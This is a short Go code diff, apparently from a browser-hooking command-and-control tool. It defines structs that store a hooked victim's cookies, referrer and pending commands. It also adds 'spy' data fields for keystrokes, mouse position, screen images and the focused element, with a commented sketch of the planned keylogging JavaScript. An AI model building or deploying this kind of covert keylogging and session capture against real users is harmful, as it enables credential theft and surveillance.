@@ -58,8 +58,8 @@ type Trigger struct {
 	Referrer    string
 	Cookies     []*http.Cookie
 	Status      string
-	Commands    []string //[]TriggerCommand
-	Online      bool
+	Commands    []TriggerCommand
+	Online      bool //TODO: move to "Browsers" once implemented?
 }
 
 type TriggerCommand struct {
@@ -80,4 +80,25 @@ type PollRequestJSON struct {
 	Poll          string
 	UID           string
 	ActionResults []string
+	SpyData       SpyDataJSON
+}
+
+/*
+	res["spy_mode"] = {
+		mouse: { x: mouse_x, y: mouse_y }, //TODO: addEventListener onmousemove
+		keyboard: pressed_keys, //TODO: addEventListener onkeydown
+		image: null,
+		focused_element: document.activeElement,
+	};
+*/
+type SpyDataJSON struct {
+	MouseCoords    SpyDataMouse
+	Keyboard       []string
+	Image          []byte
+	FocusedElement string
+}
+
+type SpyDataMouse struct {
+	X int
+	Y int
 }
